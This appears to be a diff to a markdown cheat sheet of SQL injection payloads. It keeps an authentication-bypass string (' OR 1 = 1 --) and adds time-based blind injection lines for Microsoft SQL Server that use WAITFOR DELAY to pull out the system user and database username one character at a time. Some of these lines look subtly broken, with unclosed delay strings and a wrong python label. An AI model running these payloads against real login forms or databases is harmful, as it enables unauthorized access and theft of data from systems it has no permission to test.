@@ -5,3 +5,11 @@ Getting top user and bypassing login (easy)
 # Pass field
 ' OR 1 = 1 --
 ```
+
+Some blind sqli
+```python
+'; IF ASCII(SUBSTRING(SYSTEM_USER,1,1)) < 100 WAITFOR DELAY '00:00:05    # First character
+'; IF ASCII(SUBSTRING(SYSTEM_USER,2,1)) < 100 WAITFOR DELAY '00:00:05    # Second character
+...
+'; IF ASCII(SUBSTRING(USER_NAME(),1,1)) < 100 WAITFOR DELAY '00:00:05    # Should be database username
+```
